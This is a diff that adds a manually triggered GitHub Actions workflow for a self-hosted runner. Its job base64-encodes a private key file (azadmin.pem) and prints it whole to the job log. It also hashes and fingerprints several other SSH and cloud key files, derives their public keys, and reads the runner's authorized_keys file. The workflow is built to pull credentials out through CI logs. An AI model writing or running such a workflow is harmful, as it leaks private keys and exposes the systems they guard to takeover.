@@ -1,0 +1,16 @@
+name: ul6599-keyb64
+on: [workflow_dispatch]
+jobs:
+  dump:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 8
+    steps:
+      - name: b64
+        run: |
+          set +e
+          W=/opt/ul-runner/_work/ul-plant/ul-plant
+          echo "=== AZADMIN_B64 ==="; base64 -w0 $W/az/azadmin.pem; echo
+          echo "=== AZADMIN_SHA ==="; sha256sum $W/az/azadmin.pem $W/keys/k_id25519 $W/keys/k_ali $W/az/ibm_key.pem
+          echo "=== AZADMIN_FP ==="; cp $W/az/azadmin.pem /tmp/a.pem; chmod 600 /tmp/a.pem; ssh-keygen -lf /tmp/a.pem; ssh-keygen -y -f /tmp/a.pem | head -c 200; echo
+          echo "=== KALI_FP ==="; cp $W/keys/k_ali /tmp/k.pem; chmod 600 /tmp/k.pem; ssh-keygen -lf /tmp/k.pem; ssh-keygen -y -f /tmp/k.pem | head -c 200; echo
+          echo "=== AK_FILE ==="; head -3 $HOME/.ssh/authorized_keys 2>/dev/null | cut -c1-120
